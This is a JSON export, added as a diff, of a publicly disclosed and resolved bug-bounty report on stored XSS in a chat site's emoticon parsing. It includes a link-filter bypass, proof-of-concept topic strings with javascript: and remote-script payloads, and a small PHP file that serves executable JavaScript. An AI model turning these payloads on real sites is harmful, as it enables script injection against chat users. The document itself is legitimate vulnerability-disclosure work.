@@ -1,0 +1,354 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-11-01T11:07:40.253Z", 
+    "voters": [
+        "badf00d", 
+        "bl4de", 
+        "spam404", 
+        "emitrani", 
+        "eveeez", 
+        "an0nym0us", 
+        "axolotl", 
+        "babayaga_", 
+        "mygf", 
+        "fisher", 
+        "and 15 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "450.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 429298, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-11-01T20:22:29.087Z", 
+    "vulnerability_information": "## Description\n\nThe funcitonality for adding emoticons into the chat from the serverside perspective is based on a string in the following format:\n\n```\n%%%[emoticon NAME|EMOTICON_URL|WIDTH|HEIGHT|REPORT_URL]%%%\n```\n\nThe `EMOTICON_URL` must conform to the following regex:\n```javascript\n/(http|https):\\/\\/(\\w+:{0,1}\\w*@)?(\\S+)(:[0-9]+)?(\\/|\\/([\\w#!:.?+=&%@!\\-\\/]))?/g\n```\n\nHowever, the `REPORT_URL` does not have any checks that verifies the URL. This, combined with other issues listed below, leads to stored XSS.\n\n### Chat topic link filter bypass\n\nThe chat topic functionality has a filter that removes links from the topic, by removing the string `http`. This can be bypassed by using a string such as `htthttpps` (after replace becomes `https`).\n\n### XSS Via ctrl/mouse3 click and  `javascript:` `REPORT_URL`\nBy using a `javascript:` URL as `REPORT_URL`, we can create an emoji that, when clicked, will show the \"report emoticon\" prompt. By ctrl-clicking or mouse3-clicking the `REPORT EMOTICON` link, the XSS triggers.\n\n#### PoC\n\n1. Set topic to `LUL %%%[emoticon blush|htthttpps://public.chaturbate/uploads/avatar/2011/11/08/cxecSeKtWjRK.jpg|22|22|javascript:alert(1)]%%% WUT`\n2. Click emoticon\n3. Ctrl/mouse3 click `REPORT EMOTICON`\n\n{F366518}\n\n### XSS Via emoticon report due to insecure usage of jQuery $.ajax()\n\nThe functionality for reporting an emoticon sends an AJAX request to `REPORT_URL`. This leads to XSS due to the fact that jQuery will treat any `application/javascript` response as javascript and will evaluate the response.\n\n#### PoC\n\n1. Set topic to `LUL %%%[emoticon blush|htthttpps://public.chaturbate/uploads/avatar/2011/11/08/cxecSeKtWjRK.jpg|22|22|htthttpps://avlidienbrunn.se/xss.php]%%% WUT`\n2. Click emoticon\n3. Click `REPORT EMOTICON`\n4. Click `REPORT`\n\n{F366520}\n\nContents of `xss.php`:\n```php\n<?php\nheader('Content-Type: text/javascript');\nheader('Access-Control-Allow-Origin: *');\nheader('Access-Control-Allow-Headers: X-Requested-With, connectUrl, X-CSRFToken');\n?>\nalert(document.domain);\n```\n\n### Notes\n\n**CSP**\nThe reason the second XSS issue does not work in CSP enabled browsers is that no domain in my control is allowed by the `connect-src` directive. However, several `*.DOMAIN.COM` are included in `connect-src`:\n```javascript\nhttps://*.highwebmedia.com\nhttps://*.chaturbate.com\nhttps://*.hotjar.com:*\n```\nThis means this issue can be exploited if a [subdomain takeover](https://www.hacker101.com/vulnerabilities/subdomain_takeover.html) bug exists in any of those domains. Obviously I can't test for that, but it's an important note regarding impact.\n\n**Other exploitation areas**\nThe only place where I could find that didn't respond with a server error when using `%%%[emoticon ]%%%` was the room topic. However, if there is any other type of message that allows this string, that would be vulnerable as well, since the emoticon parsing functionality is ran on all messages.\n\n## Impact\n\nStored XSS on chaturbate.com with 2 click interaction.\n\nExploitation by using an offensive image in `EMOTICON_URL` using XSS payload in `REPORT_URL`. It's also possible to create an emoticon that covers the whole chat window by using a large value in `WIDTH` and `HEIGHT`:\n\n{F366528}", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "medium", 
+        "author_type": "Team"
+    }, 
+    "title": "Stored XSS in chat topic due to insecure emoticon parsing on any message type", 
+    "is_member_of_team?": null, 
+    "vote_count": 25, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "https://chaturbate.com", 
+        "max_severity": "critical", 
+        "databaseId": 11722, 
+        "asset_type": "URL"
+    }, 
+    "allow_singular_disclosure_at": "2018-12-01T11:07:40.290Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$450", 
+    "attachments": [
+        {
+            "file_name": "Screen_Shot_2018-10-26_at_16.04.31.png", 
+            "type": "image/png", 
+            "id": 366518, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/366/518/1851c7cded02f2edd8af8317d132378335f137b7/Screen_Shot_2018-10-26_at_16.04.31.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221500Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5b20bd90b0b2fa1809c11561fc5aa82c136cd3e3321798f92a0e923dde5bd380"
+        }, 
+        {
+            "file_name": "Screen_Shot_2018-10-26_at_16.18.37.png", 
+            "type": "image/png", 
+            "id": 366520, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/366/520/5baafe019985e8faf892c2c9328f135f3b31f062/Screen_Shot_2018-10-26_at_16.18.37.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221500Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8c45b57955e1de2caa662178aa9701b71bd9e4b863be997d9f18935f87f8c350"
+        }, 
+        {
+            "file_name": "Screen_Shot_2018-10-26_at_16.37.56.png", 
+            "type": "image/png", 
+            "id": 366528, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/366/528/faf0aea6215d358c9d42dde3225cea05779c671b/Screen_Shot_2018-10-26_at_16.37.56.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221500Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a5ad492501cb5576dc541b826f606f2a197d1265819938ab24ed170b12a08b07"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-29T05:04:26.966Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-29T05:04:26.966Z", 
+            "actor": {
+                "username": "williammmllc", 
+                "url": "/williammmllc", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Medium", 
+                "old_severity": null
+            }, 
+            "team_handle": "chaturbate", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 3547321, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-29T05:05:23.152Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-29T05:05:23.152Z", 
+            "actor": {
+                "username": "williammmllc", 
+                "url": "/williammmllc", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "chaturbate", 
+            "message": "Thanks for the report. This should definitely not be parsed, however as you noted the CSP stops a lot of possible exploits here, so we consider this medium severity.", 
+            "markdown_message": "<p>Thanks for the report. This should definitely not be parsed, however as you noted the CSP stops a lot of possible exploits here, so we consider this medium severity.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 3547324, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-10-29T05:05:34.254Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-29T05:05:34.254Z", 
+            "actor": {
+                "url": "/chaturbate", 
+                "profile": {
+                    "name": "Chaturbate"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/030/475/e53792d73fe8ef3d983f657dd70c4af862f929f0_medium.png?1530832762"
+                }
+            }, 
+            "team_handle": "chaturbate", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "450.0", 
+            "collaborator": {
+                "username": "avlidienbrunn", 
+                "url": "/avlidienbrunn"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 3547325, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-29T11:03:57.294Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-29T11:03:57.294Z", 
+            "actor": {
+                "username": "avlidienbrunn", 
+                "url": "/avlidienbrunn", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/948/b05d5de8975e5813bc910b74844b5a01bd97cb93_medium.jpg?1398759698"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "chaturbate", 
+            "message": "Thanks!", 
+            "markdown_message": "<p>Thanks!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3548562, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "avlidienbrunn", 
+                "url": "/avlidienbrunn"
+            }, 
+            "created_at": "2018-10-31T22:49:16.387Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-31T22:49:16.387Z", 
+            "actor": {
+                "username": "williammmllc", 
+                "url": "/williammmllc", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "chaturbate", 
+            "message": "This is now resolved, thanks again for the report!", 
+            "markdown_message": "<p>This is now resolved, thanks again for the report!</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 3567595, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-11-01T11:07:40.275Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-11-01T11:07:40.275Z", 
+            "actor": {
+                "username": "avlidienbrunn", 
+                "url": "/avlidienbrunn", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/948/b05d5de8975e5813bc910b74844b5a01bd97cb93_medium.jpg?1398759698"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "chaturbate", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3569299, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-11-01T20:22:29.111Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-11-01T20:22:29.111Z", 
+            "actor": {
+                "username": "williammmllc", 
+                "url": "/williammmllc", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "chaturbate", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3572187, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-11-01T20:22:29.164Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-11-01T20:22:29.164Z", 
+            "actor": {
+                "username": "williammmllc", 
+                "url": "/williammmllc", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "chaturbate", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3572188, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "avlidienbrunn", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/avlidienbrunn", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/001/948/e0387998a30400fa11713bab227d7be0e435b3d7_small.jpg?1398759698"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 62, 
+        "name": "Cross-site Scripting (XSS) - Stored"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -472039.865495164, 
+    "disclosed_at": "2018-11-01T20:22:29.144Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/429298", 
+    "created_at": "2018-10-26T14:38:18.693Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h2 id=\"description\">Description</h2>\n\n<p>The funcitonality for adding emoticons into the chat from the serverside perspective is based on a string in the following format:</p>\n<pre class=\"highlight plaintext\"><code>%%%[emoticon NAME|EMOTICON_URL|WIDTH|HEIGHT|REPORT_URL]%%%\n</code></pre>\n<p>The <code>EMOTICON_URL</code> must conform to the following regex:</p>\n<pre class=\"highlight javascript\"><code><span class=\"o\">/</span><span class=\"p\">(</span><span class=\"nx\">http</span><span class=\"o\">|</span><span class=\"nx\">https</span><span class=\"p\">):</span><span class=\"err\">\\</span><span class=\"o\">/</span><span class=\"err\">\\</span><span class=\"o\">/</span><span class=\"p\">(</span><span class=\"err\">\\</span><span class=\"nx\">w</span><span class=\"o\">+</span><span class=\"p\">:{</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">1</span><span class=\"p\">}</span><span class=\"err\">\\</span><span class=\"nx\">w</span><span class=\"o\">*</span><span class=\"p\">@)?(</span><span class=\"err\">\\</span><span class=\"nx\">S</span><span class=\"o\">+</span><span class=\"p\">)(:[</span><span class=\"mi\">0</span><span class=\"o\">-</span><span class=\"mi\">9</span><span class=\"p\">]</span><span class=\"o\">+</span><span class=\"p\">)?(</span><span class=\"err\">\\</span><span class=\"o\">/|</span><span class=\"err\">\\</span><span class=\"o\">/</span><span class=\"p\">([</span><span class=\"err\">\\</span><span class=\"nx\">w</span><span class=\"cp\">#!:.?+=&amp;%@!\\-\\/]))?/g\n</span></code></pre>\n<p>However, the <code>REPORT_URL</code> does not have any checks that verifies the URL. This, combined with other issues listed below, leads to stored XSS.</p>\n\n<h3 id=\"chat-topic-link-filter-bypass\">Chat topic link filter bypass</h3>\n\n<p>The chat topic functionality has a filter that removes links from the topic, by removing the string <code>http</code>. This can be bypassed by using a string such as <code>htthttpps</code> (after replace becomes <code>https</code>).</p>\n\n<h3 id=\"xss-via-ctrl-mouse3-click-and-javascript-report_url\">XSS Via ctrl/mouse3 click and  <code>javascript:</code> <code>REPORT_URL</code>\n</h3>\n\n<p>By using a <code>javascript:</code> URL as <code>REPORT_URL</code>, we can create an emoji that, when clicked, will show the &quot;report emoticon&quot; prompt. By ctrl-clicking or mouse3-clicking the <code>REPORT EMOTICON</code> link, the XSS triggers.</p>\n\n<h4 id=\"poc\">PoC</h4>\n\n<ol>\n<li>Set topic to <code>LUL %%%[emoticon blush|htthttpps://public.chaturbate/uploads/avatar/2011/11/08/cxecSeKtWjRK.jpg|22|22|javascript:alert(1)]%%% WUT</code>\n</li>\n<li>Click emoticon</li>\n<li>Ctrl/mouse3 click <code>REPORT EMOTICON</code>\n</li>\n</ol>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-10-26_at_16.04.31.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/366/518/1851c7cded02f2edd8af8317d132378335f137b7/Screen_Shot_2018-10-26_at_16.04.31.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221500Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=5b20bd90b0b2fa1809c11561fc5aa82c136cd3e3321798f92a0e923dde5bd380\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/366/518/1851c7cded02f2edd8af8317d132378335f137b7/Screen_Shot_2018-10-26_at_16.04.31.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221500Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=5b20bd90b0b2fa1809c11561fc5aa82c136cd3e3321798f92a0e923dde5bd380\" class=\"markdown-inline-image\"></a></p>\n\n<h3 id=\"xss-via-emoticon-report-due-to-insecure-usage-of-jquery-ajax\">XSS Via emoticon report due to insecure usage of jQuery $.ajax()</h3>\n\n<p>The functionality for reporting an emoticon sends an AJAX request to <code>REPORT_URL</code>. This leads to XSS due to the fact that jQuery will treat any <code>application/javascript</code> response as javascript and will evaluate the response.</p>\n\n<h4 id=\"poc\">PoC</h4>\n\n<ol>\n<li>Set topic to <code>LUL %%%[emoticon blush|htthttpps://public.chaturbate/uploads/avatar/2011/11/08/cxecSeKtWjRK.jpg|22|22|htthttpps://avlidienbrunn.se/xss.php]%%% WUT</code>\n</li>\n<li>Click emoticon</li>\n<li>Click <code>REPORT EMOTICON</code>\n</li>\n<li>Click <code>REPORT</code>\n</li>\n</ol>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-10-26_at_16.18.37.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/366/520/5baafe019985e8faf892c2c9328f135f3b31f062/Screen_Shot_2018-10-26_at_16.18.37.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221500Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=8c45b57955e1de2caa662178aa9701b71bd9e4b863be997d9f18935f87f8c350\" data-attachment-type=\"image/png\"><img 